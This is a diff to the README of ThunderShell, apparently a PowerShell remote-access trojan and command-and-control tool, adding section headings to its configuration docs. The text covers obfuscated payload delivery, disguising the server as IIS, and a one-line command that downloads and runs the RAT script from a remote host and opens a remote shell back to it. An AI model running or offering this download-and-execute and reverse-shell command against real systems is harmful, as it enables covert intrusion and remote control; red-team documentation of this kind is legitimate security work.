@@ -59,6 +59,8 @@ default.json:
         "max-output-timeout": 5
 }
 ```
+
+### HTTPS configuration
 If `https-enabled` is `on`, `https-cert-path` must point to a PEM file with this structure:
 
 ```
@@ -69,6 +71,7 @@ If `https-enabled` is `on`, `https-cert-path` must point to a PEM file with this
 ... (certificate in base64 PEM encoding) ...
 -----END CERTIFICATE-----
 ```
+### Payload delivery
 
 The `http-download-path` is used to deliver the PowerShell RAT code. It will perform variables renaming by default and will deliver the payload only if the path match the one defined by the `"http-download-path` variable.
 
@@ -82,7 +85,11 @@ $gKnYkZ = Random-String -Length $mFkqJYoMKGl $MRdSPFQGDCQ = "hello $($gKnYkZ)" }
 
 On your target you can execute the PowerShell script using the following command `IEX (New-Object Net.WebClient).DownloadString("http://1.1.1.1:8080/cat.png"); PS-RemoteShell -ip 1.1.1.1 -port 8080 -key test`
 
+### Splash page configuration
+
 You can customize the "error" page that is returned for every GET requests by specifying your HTML template through the `http-default-404` variable. The file need to be placed in the `html` folder and depencies such as images in the `download` folder. By default ThunderShell is mimicking an IIS server and return the default IIS server page.
+
+### Delivering files
 
 Everything that is placed in the `download` folder can be downloaded from the web server:
 
